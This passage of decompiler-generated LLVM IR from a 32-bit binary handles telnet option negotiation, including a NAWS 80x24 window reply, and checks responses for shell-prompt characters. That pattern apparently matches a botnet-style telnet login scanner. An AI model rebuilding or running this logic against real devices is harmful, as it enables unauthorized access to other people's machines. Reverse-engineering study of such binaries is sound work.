  %v2_805042c = add i32 %v0_805041b, -16
  %v3_805042c = inttoptr i32 %v2_805042c to i32*
  store i32 %v3_8050429, i32* %v3_805042c, align 4
  %v0_805042d = call i32 @function_80521c4()
  store i32 %v0_805042d, i32* %eax.global-to-local, align 4
  %v0_8050432 = load i32, i32* @esp, align 4
  %v1_8050435 = add i32 %v0_8050432, 28
  %v2_8050435 = inttoptr i32 %v1_8050435 to i32*
  store i32 16384, i32* %v2_8050435, align 4
  %v1_805043a = add i32 %v0_8050432, 24
  %v2_805043a = inttoptr i32 %v1_805043a to i32*
  store i32 2, i32* %v2_805043a, align 4
  %v1_805043c = add i32 %v0_8050432, 20
  %v2_805043c = inttoptr i32 %v1_805043c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_805043c, align 4
  %v0_8050441 = load i32, i32* @edi, align 4
  %v1_8050441 = add i32 %v0_8050441, 4
  %v2_8050441 = inttoptr i32 %v1_8050441 to i32*
  %v3_8050441 = load i32, i32* %v2_8050441, align 4
  store i32 %v3_8050441, i32* %ecx.global-to-local, align 4
  %v2_8050444 = add i32 %v0_8050432, 16
  %v3_8050444 = inttoptr i32 %v2_8050444 to i32*
  store i32 %v3_8050441, i32* %v3_8050444, align 4
  %v0_8050445 = call i32 @function_80521c4()
  store i32 %v0_8050445, i32* %eax.global-to-local, align 4
  %v0_805044a = load i32, i32* @esp, align 4
  %v1_805044a = inttoptr i32 %v0_805044a to i32*
  store i32 20, i32* %v1_805044a, align 4
  %v2_8050451 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050451, i32* %eax.global-to-local, align 4
  %v0_8050459 = load i32, i32* @edi, align 4
  %v1_8050459 = add i32 %v0_8050459, 12
  %v2_8050459 = inttoptr i32 %v1_8050459 to i32*
  store i32 8, i32* %v2_8050459, align 4
  br label %dec_label_pc_8050383

dec_label_pc_8050465:                             ; preds = %dec_label_pc_8050072
  %v1_8050465 = add i32 %v0_8050072, 24
  %v2_8050465 = inttoptr i32 %v1_8050465 to i32*
  %v3_8050465 = load i32, i32* %v2_8050465, align 4
  %v1_8050468 = add i32 %v3_8050465, -1
  store i32 %v1_8050468, i32* %eax.global-to-local, align 4
  %tmp135 = icmp slt i32 %v1_8050468, 1
  br i1 %tmp135, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_8050471

dec_label_pc_8050471:                             ; preds = %dec_label_pc_8050465
  %v2_8050471 = add i32 %v0_8050072, 27
  %v3_8050471 = add i32 %v2_8050471, %v3_8050465
  %v4_8050471 = inttoptr i32 %v3_8050471 to i8*
  %v5_8050471 = load i8, i8* %v4_8050471, align 1
  %v6_8050471 = zext i8 %v5_8050471 to i32
  %v7_8050471 = load i32, i32* @edx, align 4
  %v8_8050471 = and i32 %v7_8050471, -256
  %v9_8050471 = or i32 %v8_8050471, %v6_8050471
  store i32 %v9_8050471, i32* %edx.global-to-local, align 4
  %v10_8050475 = icmp eq i8 %v5_8050471, 62
  br i1 %v10_8050475, label %dec_label_pc_80504a3.thread, label %dec_label_pc_805047a

dec_label_pc_805047a:                             ; preds = %dec_label_pc_8050471
  %v10_805047a = icmp eq i8 %v5_8050471, 58
  br i1 %v10_805047a, label %dec_label_pc_80504a3.thread, label %dec_label_pc_805047f

dec_label_pc_805047f:                             ; preds = %dec_label_pc_805047a, %dec_label_pc_805049e
  %v0_805048e = phi i32 [ %v1_805048e, %dec_label_pc_805049e ], [ %v1_8050468, %dec_label_pc_805047a ]
  %v7_8050495 = phi i32 [ %v9_8050495, %dec_label_pc_805049e ], [ %v9_8050471, %dec_label_pc_805047a ]
  %v1_805047f = trunc i32 %v7_8050495 to i8
  %v10_805047f = icmp eq i8 %v1_805047f, 36
  br i1 %v10_805047f, label %dec_label_pc_80504a3, label %dec_label_pc_8050484

dec_label_pc_8050484:                             ; preds = %dec_label_pc_805047f
  %v10_8050484 = icmp eq i8 %v1_805047f, 35
  br i1 %v10_8050484, label %dec_label_pc_80504a3, label %dec_label_pc_8050489

dec_label_pc_8050489:                             ; preds = %dec_label_pc_8050484
  %v10_8050489 = icmp eq i8 %v1_805047f, 37
  br i1 %v10_8050489, label %dec_label_pc_80504a3, label %dec_label_pc_805048e

dec_label_pc_805048e:                             ; preds = %dec_label_pc_8050489
  %v1_805048e = add i32 %v0_805048e, -1
  %v8_805048e = icmp eq i32 %v1_805048e, 0
  store i32 %v1_805048e, i32* %eax.global-to-local, align 4
  br i1 %v8_805048e, label %dec_label_pc_804fffc.backedge, label %dec_label_pc_8050495

dec_label_pc_8050495:                             ; preds = %dec_label_pc_805048e
  %v3_8050495 = add i32 %v2_8050471, %v0_805048e
  %v4_8050495 = inttoptr i32 %v3_8050495 to i8*
  %v5_8050495 = load i8, i8* %v4_8050495, align 1
  %v6_8050495 = zext i8 %v5_8050495 to i32
  %v8_8050495 = and i32 %v7_8050495, -256
  %v9_8050495 = or i32 %v6_8050495, %v8_8050495
  store i32 %v9_8050495, i32* %edx.global-to-local, align 4
  %v10_8050499 = icmp eq i8 %v5_8050495, 58
  br i1 %v10_8050499, label %dec_label_pc_80504a3, label %dec_label_pc_805049e

dec_label_pc_805049e:                             ; preds = %dec_label_pc_8050495
  %v10_805049e = icmp eq i8 %v5_8050495, 62
  %v1_80504a1 = icmp eq i1 %v10_805049e, false
  br i1 %v1_80504a1, label %dec_label_pc_805047f, label %dec_label_pc_80504a3

dec_label_pc_80504a3.thread:                      ; preds = %dec_label_pc_805047a, %dec_label_pc_8050471
  store i32 %v3_8050465, i32* @ebp, align 4
  br label %dec_label_pc_80504af

dec_label_pc_80504a3:                             ; preds = %dec_label_pc_805049e, %dec_label_pc_8050495, %dec_label_pc_8050489, %dec_label_pc_8050484, %dec_label_pc_805047f
  %v0_80504a3 = phi i32 [ %v0_805048e, %dec_label_pc_805047f ], [ %v0_805048e, %dec_label_pc_8050484 ], [ %v0_805048e, %dec_label_pc_8050489 ], [ %v1_805048e, %dec_label_pc_8050495 ], [ %v1_805048e, %dec_label_pc_805049e ]
  %v1_80504a3 = add i32 %v0_80504a3, 1
  store i32 %v1_80504a3, i32* @ebp, align 4
  %v10_80504a6 = icmp eq i32 %v0_80504a3, -2
  br i1 %v10_80504a6, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_80504af

dec_label_pc_80504af:                             ; preds = %dec_label_pc_80504a3.thread, %dec_label_pc_80504a3
  %v1_80504a3153 = phi i32 [ %v3_8050465, %dec_label_pc_80504a3.thread ], [ %v1_80504a3, %dec_label_pc_80504a3 ]
  %tmp136 = icmp slt i32 %v1_80504a3153, 1
  br i1 %tmp136, label %dec_label_pc_8050523, label %dec_label_pc_80504b3

dec_label_pc_80504b3:                             ; preds = %dec_label_pc_80504af
  %v0_80504b3 = load i32, i32* @esp, align 4
  %v1_80504b6 = add i32 %v0_80504b3, -16
  %v2_80504b6 = inttoptr i32 %v1_80504b6 to i32*
  store i32 24, i32* %v2_80504b6, align 4
  %v2_80504b8 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80504b8, i32* %eax.global-to-local, align 4
  %v0_80504bd = load i32, i32* @esp, align 4
  %v1_80504bd = inttoptr i32 %v0_80504bd to i32*
  %v2_80504bd = load i32, i32* %v1_80504bd, align 4
  store i32 %v2_80504bd, i32* %eax.global-to-local, align 4
  %v3_80504bd = add i32 %v0_80504bd, 4
  %v1_80504be = inttoptr i32 %v3_80504bd to i32*
  %v2_80504be = load i32, i32* %v1_80504be, align 4
  store i32 %v2_80504be, i32* %edx.global-to-local, align 4
  %v1_80504bf = add i32 %v0_80504bd, 1864
  store i32 %v1_80504bf, i32* %ecx.global-to-local, align 4
  store i32 %v1_80504bf, i32* %v1_80504be, align 4
  store i32 24, i32* %v1_80504bd, align 4
  %v3_80504c9 = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80504c9, i32* %eax.global-to-local, align 4
  %v0_80504ce = load i32, i32* @esp, align 4
  %v1_80504ce = add i32 %v0_80504ce, -4
  %v2_80504ce = inttoptr i32 %v1_80504ce to i32*
  store i32 16384, i32* %v2_80504ce, align 4
  %v1_80504d3 = add i32 %v0_80504ce, 1864
  %v2_80504d3 = inttoptr i32 %v1_80504d3 to i32*
  %v3_80504d3 = load i32, i32* %v2_80504d3, align 4
  store i32 %v3_80504d3, i32* @esi, align 4
  %v2_80504da = add i32 %v0_80504ce, -8
  %v3_80504da = inttoptr i32 %v2_80504da to i32*
  store i32 %v3_80504d3, i32* %v3_80504da, align 4
  %v2_80504db = add i32 %v0_80504ce, -12
  %v3_80504db = inttoptr i32 %v2_80504db to i32*
  store i32 %v3_80504c9, i32* %v3_80504db, align 4
  %v0_80504dc = load i32, i32* @edi, align 4
  %v1_80504dc = add i32 %v0_80504dc, 4
  %v2_80504dc = inttoptr i32 %v1_80504dc to i32*
  %v3_80504dc = load i32, i32* %v2_80504dc, align 4
  store i32 %v3_80504dc, i32* @ebx, align 4
  %v2_80504df = add i32 %v0_80504ce, -16
  %v3_80504df = inttoptr i32 %v2_80504df to i32*
  store i32 %v3_80504dc, i32* %v3_80504df, align 4
  %v0_80504e0 = call i32 @function_80521c4()
  store i32 %v0_80504e0, i32* %eax.global-to-local, align 4
  %v0_80504e5 = load i32, i32* @esp, align 4
  %v1_80504e8 = add i32 %v0_80504e5, 28
  %v2_80504e8 = inttoptr i32 %v1_80504e8 to i32*
  store i32 16384, i32* %v2_80504e8, align 4
  %v1_80504ed = add i32 %v0_80504e5, 24
  %v2_80504ed = inttoptr i32 %v1_80504ed to i32*
  store i32 2, i32* %v2_80504ed, align 4
  %v1_80504ef = add i32 %v0_80504e5, 20
  %v2_80504ef = inttoptr i32 %v1_80504ef to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80504ef, align 4
  %v0_80504f4 = load i32, i32* @edi, align 4
  %v1_80504f4 = add i32 %v0_80504f4, 4
  %v2_80504f4 = inttoptr i32 %v1_80504f4 to i32*
  %v3_80504f4 = load i32, i32* %v2_80504f4, align 4
  store i32 %v3_80504f4, i32* %ecx.global-to-local, align 4
  %v2_80504f7 = add i32 %v0_80504e5, 16
  %v3_80504f7 = inttoptr i32 %v2_80504f7 to i32*
  store i32 %v3_80504f4, i32* %v3_80504f7, align 4
  %v0_80504f8 = call i32 @function_80521c4()
  store i32 %v0_80504f8, i32* %eax.global-to-local, align 4
  %v0_80504fd = load i32, i32* @esp, align 4
  %v1_80504fd = inttoptr i32 %v0_80504fd to i32*
  store i32 24, i32* %v1_80504fd, align 4
  %v2_8050504 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050504, i32* %eax.global-to-local, align 4
  %v0_805050c = load i32, i32* @edi, align 4
  %v1_805050c = add i32 %v0_805050c, 12
  %v2_805050c = inttoptr i32 %v1_805050c to i32*
  store i32 10, i32* %v2_805050c, align 4
  br label %dec_label_pc_8050383

dec_label_pc_8050518:                             ; preds = %dec_label_pc_80500a1
  %v1_8050518 = add i32 %v0_805008f, 2
  store i32 %v1_8050518, i32* @ebx, align 4
  %v1_805051b = add i32 %v0_805051b, 2
  store i32 %v1_805051b, i32* @ebp, align 4
  br label %dec_label_pc_805008b.backedge

dec_label_pc_805008b.backedge:                    ; preds = %dec_label_pc_8050518, %dec_label_pc_80507fe
  %v0_8050109117 = phi i32 [ %v0_8050109118, %dec_label_pc_8050518 ], [ %v0_8050837, %dec_label_pc_80507fe ]
  %v1_805008b = phi i32 [ %v1_805009b, %dec_label_pc_8050518 ], [ %v3_8050837, %dec_label_pc_80507fe ]
  %v0_805008b = phi i32 [ %v1_805051b, %dec_label_pc_8050518 ], [ %v0_805008b.pre, %dec_label_pc_80507fe ]
  %v5_80500a1102 = phi i32 [ %v7_80500a1, %dec_label_pc_8050518 ], [ %v0_805082f, %dec_label_pc_80507fe ]
  %v0_805009497 = phi i32 [ %v0_8050547, %dec_label_pc_8050518 ], [ %v1_8050834, %dec_label_pc_80507fe ]
  %v2_805008b = sub i32 %v0_805008b, %v1_805008b
  %v8_805008b = xor i32 %v0_805008b, %v1_805008b
  %v9_805008b = xor i32 %v2_805008b, %v0_805008b
  %v10_805008b = and i32 %v9_805008b, %v8_805008b
  %v11_805008b = icmp slt i32 %v10_805008b, 0
  %v13_805008b = icmp slt i32 %v2_805008b, 0
  %v2_805008d = icmp eq i1 %v13_805008b, %v11_805008b
  br i1 %v2_805008d, label %dec_label_pc_8050101, label %dec_label_pc_805008f.preheader

dec_label_pc_8050523:                             ; preds = %dec_label_pc_80504af, %dec_label_pc_80503f8, %dec_label_pc_8050896, %dec_label_pc_805028f, %dec_label_pc_8050675, %dec_label_pc_80507b8, %dec_label_pc_80506ee, %dec_label_pc_8050101, %dec_label_pc_805073f
  %v0_8050523 = phi i32 [ %v1_80504a3153, %dec_label_pc_80504af ], [ %v1_80503ec150, %dec_label_pc_80503f8 ], [ %v0_805088d, %dec_label_pc_8050896 ], [ %v1_8050283147, %dec_label_pc_805028f ], [ %v1_8050669, %dec_label_pc_8050675 ], [ %v0_80507b8, %dec_label_pc_80507b8 ], [ %v0_80506ee, %dec_label_pc_80506ee ], [ %v0_8050101, %dec_label_pc_8050101 ], [ %v1_8050733, %dec_label_pc_805073f ]
  %v1_8050523 = icmp eq i32 %v0_8050523, 0
  %v1_8050525 = icmp eq i1 %v1_8050523, false
  br i1 %v1_8050525, label %dec_label_pc_8050383, label %dec_label_pc_804fffc.loopexit12.loopexit

dec_label_pc_8050530:                             ; preds = %dec_label_pc_80500bb
  store i8 -4, i8* %v1_80500bb, align 1
  %v0_8050533 = load i32, i32* @ebx, align 4
  %v1_8050533 = add i32 %v0_8050533, 2
  %v2_8050533 = inttoptr i32 %v1_8050533 to i8*
  %v3_8050533 = load i8, i8* %v2_8050533, align 1
  %v4_8050533 = zext i8 %v3_8050533 to i32
  %v5_8050533 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050533 = and i32 %v5_8050533, -256
  %v7_8050533 = or i32 %v6_8050533, %v4_8050533
  store i32 %v7_8050533, i32* %eax.global-to-local, align 4
  %v11_8050536 = icmp eq i8 %v3_8050533, -3
  %v1_8050538 = icmp eq i1 %v11_8050536, false
  br i1 %v1_8050538, label %dec_label_pc_80500d8, label %dec_label_pc_805053e

dec_label_pc_805053e:                             ; preds = %dec_label_pc_8050530, %dec_label_pc_80500cd
  %v0_805053e = phi i32 [ %v0_8050533, %dec_label_pc_8050530 ], [ %v0_80500cd, %dec_label_pc_80500cd ]
  %v1_805053e = add i32 %v0_805053e, 2
  %v2_805053e = inttoptr i32 %v1_805053e to i8*
  store i8 -4, i8* %v2_805053e, align 1
  br label %dec_label_pc_80500e0

dec_label_pc_8050547:                             ; preds = %dec_label_pc_80500ac
  %v1_8050547 = add i32 %v0_8050547, 1863
  %v2_8050547 = inttoptr i32 %v1_8050547 to i8*
  store i8 -1, i8* %v2_8050547, align 1
  %v0_805054f = load i32, i32* @esp, align 4
  %v1_805054f = add i32 %v0_805054f, 1864
  %v2_805054f = inttoptr i32 %v1_805054f to i8*
  store i8 -5, i8* %v2_805054f, align 1
  %v0_8050557 = load i32, i32* @esp, align 4
  %v1_8050557 = add i32 %v0_8050557, 1865
  %v2_8050557 = inttoptr i32 %v1_8050557 to i8*
  store i8 31, i8* %v2_8050557, align 1
  %v0_805055f = load i32, i32* @esp, align 4
  %v1_805055f = add i32 %v0_805055f, 1831
  %v2_805055f = inttoptr i32 %v1_805055f to i8*
  store i8 -1, i8* %v2_805055f, align 1
  %v0_8050567 = load i32, i32* @esp, align 4
  %v1_8050567 = add i32 %v0_8050567, 1832
  %v2_8050567 = inttoptr i32 %v1_8050567 to i8*
  store i8 -6, i8* %v2_8050567, align 1
  %v0_805056f = load i32, i32* @esp, align 4
  %v1_805056f = add i32 %v0_805056f, 1833
  %v2_805056f = inttoptr i32 %v1_805056f to i8*
  store i8 31, i8* %v2_805056f, align 1
  %v0_8050577 = load i32, i32* @esp, align 4
  %v1_8050577 = add i32 %v0_8050577, 1834
  %v2_8050577 = inttoptr i32 %v1_8050577 to i8*
  store i8 0, i8* %v2_8050577, align 1
  %v0_805057f = load i32, i32* @esp, align 4
  %v1_805057f = add i32 %v0_805057f, 1835
  %v2_805057f = inttoptr i32 %v1_805057f to i8*
  store i8 80, i8* %v2_805057f, align 1
  %v0_8050587 = load i32, i32* @esp, align 4
  %v1_8050587 = add i32 %v0_8050587, 1836
  %v2_8050587 = inttoptr i32 %v1_8050587 to i8*
  store i8 0, i8* %v2_8050587, align 1
  %v0_805058f = load i32, i32* @esp, align 4
  %v1_805058f = add i32 %v0_805058f, 1837
  %v2_805058f = inttoptr i32 %v1_805058f to i8*
  store i8 24, i8* %v2_805058f, align 1
  %v0_8050597 = load i32, i32* @esp, align 4
  %v1_8050597 = add i32 %v0_8050597, 1838
  %v2_8050597 = inttoptr i32 %v1_8050597 to i8*
  store i8 -1, i8* %v2_8050597, align 1
  %v0_805059f = load i32, i32* @esp, align 4
  %v1_805059f = add i32 %v0_805059f, 1839
  %v2_805059f = inttoptr i32 %v1_805059f to i8*
  store i8 -16, i8* %v2_805059f, align 1
  %v0_80505a7 = load i32, i32* @esp, align 4
  %v1_80505a7 = add i32 %v0_80505a7, 8
  %v2_80505a7 = inttoptr i32 %v1_80505a7 to i32*
  %v3_80505a7 = load i32, i32* %v2_80505a7, align 4
  store i32 %v3_80505a7, i32* %eax.global-to-local, align 4
  %v0_80505ab = load i32, i32* @edi, align 4
  %v1_80505ab = add i32 %v0_80505ab, 24
  %v2_80505ab = inttoptr i32 %v1_80505ab to i32*
  %v3_80505ab = load i32, i32* %v2_80505ab, align 4
  store i32 %v3_80505ab, i32* %ecx.global-to-local, align 4
  %v0_80505ae = load i32, i32* @ebx, align 4
  %v1_80505ae = add i32 %v0_80505ae, 2
  store i32 %v1_80505ae, i32* %edx.global-to-local, align 4
  %v2_80505b1 = add i32 %v3_80505ab, %v3_80505a7
  store i32 %v2_80505b1, i32* %eax.global-to-local, align 4
  %tmp275 = icmp ugt i32 %v2_80505b1, %v1_80505ae
  br i1 %tmp275, label %dec_label_pc_80505bb, label %dec_label_pc_8050547.dec_label_pc_8050101.loopexit_crit_edge

dec_label_pc_8050547.dec_label_pc_8050101.loopexit_crit_edge: ; preds = %dec_label_pc_8050547
  %v0_8050101.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8050101

dec_label_pc_80505bb:                             ; preds = %dec_label_pc_8050547
  %v2_80505bb = inttoptr i32 %v1_80505ae to i8*
  %v3_80505bb = load i8, i8* %v2_80505bb, align 1
  %v12_80505bb = icmp eq i8 %v3_80505bb, 31
  br i1 %v12_80505bb, label %dec_label_pc_80507fe, label %dec_label_pc_80505c5

dec_label_pc_80505c5:                             ; preds = %dec_label_pc_80505bb
  %v1_80505c5 = inttoptr i32 %v0_80505ae to i8*
  %v2_80505c5 = load i8, i8* %v1_80505c5, align 1
  %v3_80505c5 = zext i8 %v2_80505c5 to i32
  %v5_80505c5 = and i32 %v2_80505b1, -256
  %v6_80505c5 = or i32 %v3_80505c5, %v5_80505c5
  store i32 %v6_80505c5, i32* %eax.global-to-local, align 4
  %v11_80505c7 = icmp eq i8 %v2_80505c5, -3
  %v1_80505c9 = icmp eq i1 %v11_80505c7, false
  br i1 %v1_80505c9, label %dec_label_pc_805098d, label %dec_label_pc_80505cf

dec_label_pc_80505cf:                             ; preds = %dec_label_pc_80505c5
  store i8 -4, i8* %v1_80505c5, align 1
  br label %dec_label_pc_80500bb

dec_label_pc_80505d7:                             ; preds = %dec_label_pc_805001b
  %v1_8050048 = icmp eq i32 %v0_8050040, 0
  br i1 %v1_8050048, label %dec_label_pc_805099d, label %dec_label_pc_80505dd

dec_label_pc_80505dd:                             ; preds = %dec_label_pc_80505d7
  %v10_80505dd = icmp eq i32 %v0_8050040, -1
  %v1_80505e0 = icmp eq i1 %v10_80505dd, false
  br i1 %v1_80505e0, label %dec_label_pc_8050062, label %dec_label_pc_80505e6

dec_label_pc_80505e6:                             ; preds = %dec_label_pc_80505dd
  %v1_80505e6 = add i32 %v0_8050045, 40
  %v2_80505e6 = inttoptr i32 %v1_80505e6 to i32*
  %v3_80505e6 = load i32, i32* %v2_80505e6, align 4
  store i32 %v3_80505e6, i32* %ecx.global-to-local, align 4
  %v1_80505ea = inttoptr i32 %v3_80505e6 to i32*
  %v2_80505ea = load i32, i32* %v1_80505ea, align 4
  %v11_80505ea = icmp eq i32 %v2_80505ea, 11
  br i1 %v11_80505ea, label %dec_label_pc_804fece, label %dec_label_pc_80505f3

dec_label_pc_80505f3:                             ; preds = %dec_label_pc_80505e6, %dec_label_pc_805099d
  %v0_80505f3 = phi i32 [ %v1_8050045, %dec_label_pc_80505e6 ], [ %v0_80505f3.pre, %dec_label_pc_805099d ]
  %v0_80505f6 = load i32, i32* @edi, align 4
  %v1_80505f6 = add i32 %v0_80505f6, 4
  %v2_80505f6 = inttoptr i32 %v1_80505f6 to i32*
  %v3_80505f6 = load i32, i32* %v2_80505f6, align 4
  store i32 %v3_80505f6, i32* %esi.global-to-local, align 4
  %v2_80505f9 = add i32 %v0_80505f3, -16
  %v3_80505f9 = inttoptr i32 %v2_80505f9 to i32*
  store i32 %v3_80505f6, i32* %v3_80505f9, align 4
  %v1_80505fa = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80505fa, i32* %eax.global-to-local, align 4
  %v0_8050602 = load i32, i32* @edi, align 4
  %v1_8050602 = add i32 %v0_8050602, 4
  %v2_8050602 = inttoptr i32 %v1_8050602 to i32*
  store i32 -1, i32* %v2_8050602, align 4
  %v0_8050609 = load i32, i32* @global_var_8056158.47, align 8
  store i32 %v0_8050609, i32* %edx.global-to-local, align 4
  %v0_805060f = load i32, i32* @esp, align 4
  %v1_805060f = add i32 %v0_805060f, 1852
  %v2_805060f = inttoptr i32 %v1_805060f to i32*
  %v3_805060f = load i32, i32* %v2_805060f, align 4
  store i32 %v3_805060f, i32* %eax.global-to-local, align 4
  %v1_8050616 = add i32 %v0_8050609, -1
  store i32 %v1_8050616, i32* %edx.global-to-local, align 4
  %v1_8050617 = mul i32 %v3_805060f, 4
  %v2_8050617 = add i32 %v1_8050617, 134570496
  %v3_8050617 = inttoptr i32 %v2_8050617 to i32*
  %v4_8050617 = load i32, i32* %v3_8050617, align 4
  %v6_8050617 = sub i32 %v4_8050617, %v1_8050616
  %v12_8050617 = xor i32 %v4_8050617, %v1_8050616
  %v13_8050617 = xor i32 %v6_8050617, %v4_8050617
  %v14_8050617 = and i32 %v13_8050617, %v12_8050617
  %v15_8050617 = icmp slt i32 %v14_8050617, 0
  %v16_8050617 = icmp eq i32 %v6_8050617, 0
  %v17_8050617 = icmp slt i32 %v6_8050617, 0
  %v3_805061e = icmp ne i1 %v17_8050617, %v15_8050617
  %v4_805061e = or i1 %v16_8050617, %v3_805061e
  %v0_80509ac = load i32, i32* @edi, align 4
  br i1 %v4_805061e, label %dec_label_pc_80509ac, label %dec_label_pc_8050624

dec_label_pc_8050624:                             ; preds = %dec_label_pc_80505f3
  %v1_8050624 = add i32 %v0_80509ac, 284
  %v2_8050624 = inttoptr i32 %v1_8050624 to i8*
  store i8 0, i8* %v2_8050624, align 1
  %v0_805062b = load i32, i32* @edi, align 4
  %v1_805062b = add i32 %v0_805062b, 12
  %v2_805062b = inttoptr i32 %v1_805062b to i32*
  store i32 0, i32* %v2_805062b, align 4
  br label %dec_label_pc_804fece

dec_label_pc_8050637:                             ; preds = %dec_label_pc_80500c5
  store i8 -3, i8* %v1_80500bb, align 1
  %v5_80500cd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80500cd

dec_label_pc_805063f:                             ; preds = %dec_label_pc_8050007
  %v1_805063f = load i32, i32* @esp, align 4
  %v2_805063f = add i32 %v1_805063f, -4
  %v3_805063f = inttoptr i32 %v2_805063f to i32*
  store i32 %v3_804fffc31, i32* %v3_805063f, align 4
  %v0_8050640 = load i32, i32* @edi, align 4
  %v1_8050640 = add i32 %v0_8050640, 92
  store i32 %v1_8050640, i32* %eax.global-to-local, align 4
  %v1_8050643 = add i32 %v1_805063f, -8
  %v2_8050643 = inttoptr i32 %v1_8050643 to i32*
  store i32 192, i32* %v2_8050643, align 4
  %v0_8050648 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050648 = add i32 %v1_805063f, -12
  %v3_8050648 = inttoptr i32 %v2_8050648 to i32*
  store i32 %v0_8050648, i32* %v3_8050648, align 4
  %v0_8050649 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050649 = add i32 %v1_805063f, -16
  %v3_8050649 = inttoptr i32 %v2_8050649 to i32*
  store i32 %v0_8050649, i32* %v3_8050649, align 4
  %v4_805064a = call i32 @function_8051fe3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805064a, i32* %eax.global-to-local, align 4
  %v0_805064f = load i32, i32* @edi, align 4
  %v1_805064f = add i32 %v0_805064f, 24
  %v2_805064f = inttoptr i32 %v1_805064f to i32*
  %v3_805064f = load i32, i32* %v2_805064f, align 4
  %v1_8050655 = add i32 %v3_805064f, -64
  store i32 %v1_8050655, i32* %eax.global-to-local, align 4
  store i32 %v1_8050655, i32* %v2_805064f, align 4
  br label %dec_label_pc_805001b

dec_label_pc_8050660:                             ; preds = %dec_label_pc_80500d8
  %v1_8050660 = add i32 %v0_8050660, 2
  %v2_8050660 = inttoptr i32 %v1_8050660 to i8*
  store i8 -3, i8* %v2_8050660, align 1
  br label %dec_label_pc_80500e0

dec_label_pc_8050669:                             ; preds = %dec_label_pc_8050234, %dec_label_pc_805022b, %dec_label_pc_8050222, %dec_label_pc_8050219, %dec_label_pc_805020c
  %v1_8050669 = add i32 %v0_8050669, 1
  store i32 %v1_8050669, i32* @ebp, align 4
  %v10_805066c = icmp eq i32 %v0_8050669, -2
  br i1 %v10_805066c, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_8050675

dec_label_pc_8050675:                             ; preds = %dec_label_pc_8050669
  %tmp137 = icmp slt i32 %v1_8050669, 1
  br i1 %tmp137, label %dec_label_pc_8050523, label %dec_label_pc_805067d

dec_label_pc_805067d:                             ; preds = %dec_label_pc_8050675
  %v0_805067d = load i32, i32* @esp, align 4
  %v1_8050680 = add i32 %v0_805067d, -16
  %v2_8050680 = inttoptr i32 %v1_8050680 to i32*
  store i32 23, i32* %v2_8050680, align 4
  %v2_8050682 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v0_8050687 = load i32, i32* @esp, align 4
  %v1_8050687 = inttoptr i32 %v0_8050687 to i32*
  %v2_8050687 = load i32, i32* %v1_8050687, align 4
  store i32 %v2_8050687, i32* %eax.global-to-local, align 4
  %v3_8050687 = add i32 %v0_8050687, 4
  %v1_8050688 = inttoptr i32 %v3_8050687 to i32*
  %v1_8050689 = add i32 %v0_8050687, 1864
  store i32 %v1_8050689, i32* %edx.global-to-local, align 4
  store i32 %v1_8050689, i32* %v1_8050688, align 4
  store i32 23, i32* %v1_8050687, align 4
  %v3_8050693 = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050693, i32* %eax.global-to-local, align 4
  %v0_8050698 = load i32, i32* @esp, align 4
  %v1_8050698 = add i32 %v0_8050698, -4
  %v2_8050698 = inttoptr i32 %v1_8050698 to i32*
  store i32 16384, i32* %v2_8050698, align 4
  %v1_805069d = add i32 %v0_8050698, 1864
  %v2_805069d = inttoptr i32 %v1_805069d to i32*
  %v3_805069d = load i32, i32* %v2_805069d, align 4
  store i32 %v3_805069d, i32* @esi, align 4
  %v2_80506a4 = add i32 %v0_8050698, -8
  %v3_80506a4 = inttoptr i32 %v2_80506a4 to i32*
  store i32 %v3_805069d, i32* %v3_80506a4, align 4
  %v2_80506a5 = add i32 %v0_8050698, -12
  %v3_80506a5 = inttoptr i32 %v2_80506a5 to i32*
  store i32 %v3_8050693, i32* %v3_80506a5, align 4
  %v0_80506a6 = load i32, i32* @edi, align 4
  %v1_80506a6 = add i32 %v0_80506a6, 4
  %v2_80506a6 = inttoptr i32 %v1_80506a6 to i32*
  %v3_80506a6 = load i32, i32* %v2_80506a6, align 4
  store i32 %v3_80506a6, i32* @ebx, align 4
  %v2_80506a9 = add i32 %v0_8050698, -16
  %v3_80506a9 = inttoptr i32 %v2_80506a9 to i32*
  store i32 %v3_80506a6, i32* %v3_80506a9, align 4
  %v0_80506aa = call i32 @function_80521c4()
  store i32 %v0_80506aa, i32* %eax.global-to-local, align 4
  %v0_80506af = load i32, i32* @esp, align 4
  %v1_80506b2 = add i32 %v0_80506af, 28
  %v2_80506b2 = inttoptr i32 %v1_80506b2 to i32*
  store i32 16384, i32* %v2_80506b2, align 4
  %v1_80506b7 = add i32 %v0_80506af, 24
  %v2_80506b7 = inttoptr i32 %v1_80506b7 to i32*
  store i32 2, i32* %v2_80506b7, align 4
  %v1_80506b9 = add i32 %v0_80506af, 20
  %v2_80506b9 = inttoptr i32 %v1_80506b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80506b9, align 4
  %v0_80506be = load i32, i32* @edi, align 4
  %v1_80506be = add i32 %v0_80506be, 4
  %v2_80506be = inttoptr i32 %v1_80506be to i32*
  %v3_80506be = load i32, i32* %v2_80506be, align 4
  store i32 %v3_80506be, i32* %ecx.global-to-local, align 4
  %v2_80506c1 = add i32 %v0_80506af, 16
